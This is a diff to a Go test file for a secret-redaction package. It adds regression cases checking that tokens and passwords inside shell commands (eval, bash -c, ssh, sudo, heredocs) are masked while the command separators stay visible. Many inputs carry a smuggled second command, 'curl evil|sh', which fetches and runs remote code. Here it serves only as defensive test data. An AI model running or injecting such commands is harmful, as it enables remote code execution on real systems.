@@ -1,9 +1,12 @@
 package redact
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 	"time"
+
+	"github.com/railse/railse-opc/internal/policy"
 )
 
 // shellCase 是命令行语境的一条回归用例：in 交给 String，得到的必须正好是 want。
@@ -201,10 +204,101 @@ func TestShellReviewCases(t *testing.T) {
 	}
 }
 
+// round2Cases 是第 2 轮评审（C-1、I-1、M-1）的输入。
+var round2Cases = []shellCase{
+	// C-1：交给 eval、sh -c、ssh 的不带引号参数里，被转义的元字符就是要执行的命令分隔符：值在反斜杠处停，后面露出来
+	{`eval TOKEN=a\;curl\ evil\|sh`, `eval TOKEN=<redacted>\;curl\ evil\|sh`},
+	{`bash -c X_TOKEN=a\;curl\ evil\|sh`, `bash -c X_TOKEN=<redacted>\;curl\ evil\|sh`},
+	{`ssh prod export API_KEY=abc\;curl\ evil\|sh`, `ssh prod export API_KEY=<redacted>\;curl\ evil\|sh`},
+	{`eval X_TOKEN=a\;curl evil\|sh`, `eval X_TOKEN=<redacted>\;curl evil\|sh`},
+	// 不交给解释器时，被转义的元字符是值的一部分，照旧整段抹
+	{`password=abc\;rm`, `password=<redacted>`},
+	{`echo TOKEN=a\;b`, `echo TOKEN=<redacted>`},
+
+	// I-1：命令名去掉引号与转义、取路径最后一段（不限长度）再认；$SHELL、${SHELL} 当 shell
+	{`"bash" -c "X_TOKEN=a;curl evil|sh"`, `"bash" -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`$'bash' -c "X_TOKEN=a;curl evil|sh"`, `$'bash' -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`ba"sh" -c "X_TOKEN=a;curl evil|sh"`, `ba"sh" -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`ba\sh -c 'X_TOKEN=a;curl evil|sh'`, `ba\sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`$SHELL -c "X_TOKEN=a;curl evil|sh"`, `$SHELL -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`${SHELL} -lc "X_TOKEN=a;curl evil|sh"`, `${SHELL} -lc "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`"$SHELL" -c 'X_TOKEN=a;curl evil|sh'`, `"$SHELL" -c 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`"eval" "X_TOKEN=a;curl evil|sh"`, `"eval" "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`"ssh" prod "X_TOKEN=a;curl evil|sh"`, `"ssh" prod "X_TOKEN=<redacted>;curl evil|sh"`},
+	{"cat <<EOF | \"bash\"\nX_TOKEN=a;curl evil|sh\nEOF", "cat <<EOF | \"bash\"\nX_TOKEN=<redacted>;curl evil|sh\nEOF"},
+	{"\"bash\" <<'EOF'\nX_TOKEN=a;curl evil|sh\nEOF", "\"bash\" <<'EOF'\nX_TOKEN=<redacted>;curl evil|sh\nEOF"},
+	{`././././././././././././././././././././././././././././././././././././././././bin/bash -c "X_TOKEN=a;curl evil|sh"`, `././././././././././././././././././././././././././././././././././././././././bin/bash -c "X_TOKEN=<redacted>;curl evil|sh"`},
+
+	// M-1：只认命令位置上的 shell、eval、ssh（命令开头、VAR=值 之后、包装命令及其选项之后）；参数里出现的不算
+	{`echo ssh 'PASSWORD=Xy7;kP|2q'`, `echo ssh 'PASSWORD=<redacted>'`},
+	{`git log --grep eval -S "PASSWORD=Xy7&kP(2)q"`, `git log --grep eval -S "PASSWORD=<redacted>"`},
+	{`echo bash -c "TOKEN=a;b|c"`, `echo bash -c "TOKEN=<redacted>"`},
+	{"echo bash <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "echo bash <<EOF\nDB_PASSWORD=<redacted>\nEOF"},
+	{`grep -r ssh . | xargs echo 'PASSWORD=Xy7;kP|2q'`, `grep -r ssh . | xargs echo 'PASSWORD=<redacted>'`},
+	// 拿不准的包装命令（docker run、kubectl exec）不当解释器：引号里的值整段抹（接受的失败方向）
+	{`docker run img sh -c "TOKEN=a;b|c"`, `docker run img sh -c "TOKEN=<redacted>"`},
+	// 包装命令及其选项之后仍认
+	{`sudo -u root bash -lc 'TOKEN=a;curl evil|sh'`, `sudo -u root bash -lc 'TOKEN=<redacted>;curl evil|sh'`},
+	{`timeout 10 bash -c 'TOKEN=a;curl evil|sh'`, `timeout 10 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`timeout -s KILL 10 sh -c 'TOKEN=a;curl evil|sh'`, `timeout -s KILL 10 sh -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`env -i PATH=/bin bash -c 'TOKEN=a;curl evil|sh'`, `env -i PATH=/bin bash -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`X=1 nohup sh -c 'TOKEN=a;curl evil|sh'`, `X=1 nohup sh -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`nice -n 5 bash -c 'TOKEN=a;curl evil|sh'`, `nice -n 5 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`exec bash -c 'TOKEN=a;curl evil|sh'`, `exec bash -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`ls | xargs -I {} sh -c 'TOKEN=a;curl evil|sh'`, `ls | xargs -I {} sh -c 'TOKEN=<redacted>;curl evil|sh'`},
+	{`find . -name x -exec sh -c 'TOKEN=a;curl evil|sh' \;`, `find . -name x -exec sh -c 'TOKEN=<redacted>;curl evil|sh' \;`},
+	{`command eval 'TOKEN=a;curl evil|sh'`, `command eval 'TOKEN=<redacted>;curl evil|sh'`},
+	{`builtin eval "TOKEN=a;curl evil|sh"`, `builtin eval "TOKEN=<redacted>;curl evil|sh"`},
+	{`if bash -c 'TOKEN=a;curl evil|sh'; then :; fi`, `if bash -c 'TOKEN=<redacted>;curl evil|sh'; then :; fi`},
+	{`(cd x && sudo env FOO=1 bash -c 'TOKEN=a;curl evil|sh')`, `(cd x && sudo env FOO=1 bash -c 'TOKEN=<redacted>;curl evil|sh')`},
+	// 递归的双引号参数里，右引号是 \" 两个字节：反斜杠不能被算进前面的值，否则结果里的引号结构变了，hub 二次脱敏时会错位
+	{`bash -c "curl -H \"Authorization: Bearer abc&def\" x" && TOKEN=a;curl evil|sh`, `bash -c "curl -H \"Authorization: <redacted>\" x" && TOKEN=<redacted>;curl evil|sh`},
+	{`bash -c "export TOKEN=\"abc\"" && TOKEN=a;curl evil|sh`, `bash -c "export TOKEN=<redacted>" && TOKEN=<redacted>;curl evil|sh`},
+}
+
+func TestShellRound2Cases(t *testing.T) {
+	for _, c := range round2Cases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+	}
+}
+
+// M-2：值位置上的 <redacted> 只有后面紧跟空白、引号或文本结尾时才只认占位符本身；后面还连着别的字符时，
+// 整段（含后面的字符）照原来的字符类抹掉。
+func TestPlaceholderFollowedBySecret(t *testing.T) {
+	if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, Path: "/x/password=<redacted>RealSecret"}).Path; got != "/x/password=<redacted>" {
+		t.Errorf("Path 得到 %q", got)
+	}
+	out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(`{"content":"password=<redacted>RealSecret x"}`)})
+	if string(out.Args) != `{"content":"password=<redacted> x"}` {
+		t.Errorf("Args 得到 %s", out.Args)
+	}
+	if got := Text("password=<redacted>RealSecret"); got != "password=<redacted>" {
+		t.Errorf("Text 得到 %q", got)
+	}
+	for _, c := range []shellCase{
+		{"cat <<'EOF'\npassword=<redacted>RealSecret\nEOF", "cat <<'EOF'\npassword=<redacted>\nEOF"},
+		{`echo 'password=<redacted>RealSecret'`, `echo 'password=<redacted>'`},
+		{`password=<redacted>RealSecret make`, `password=<redacted> make`},
+		// 后面是空白、引号、结尾时只认占位符本身，结果不变
+		{"cat <<'EOF'\npassword=<redacted> x\nEOF", "cat <<'EOF'\npassword=<redacted> x\nEOF"},
+		{`mysql -p<redacted> -pX app`, `mysql -p<redacted> -pX app`},
+	} {
+		if got := String(c.in); got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+	}
+}
+
 // corpusInputs 汇总包里所有命令行语境的用例输入：幂等性质测试与模糊测试的种子都从这里取。
 func corpusInputs() []string {
 	var ins []string
-	for _, c := range reviewCases {
+	for _, c := range append(append([]shellCase{}, reviewCases...), round2Cases...) {
 		ins = append(ins, c.in)
 	}
 	ins = append(ins, stringCorpus...)
